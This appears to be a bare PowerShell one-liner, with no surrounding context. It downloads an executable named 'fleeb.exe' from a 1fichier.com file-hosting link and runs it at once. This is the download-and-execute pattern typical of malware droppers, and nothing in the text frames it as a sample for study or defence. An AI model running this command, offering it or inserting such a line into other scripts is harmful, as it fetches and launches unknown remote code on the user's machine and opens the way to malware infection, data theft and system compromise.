
(New-Object System.Net.WebClient).DownloadFile('https://1fichier.com/?v8w3g736hj','fleeb.exe');Start-Process 'fleeb.exe'

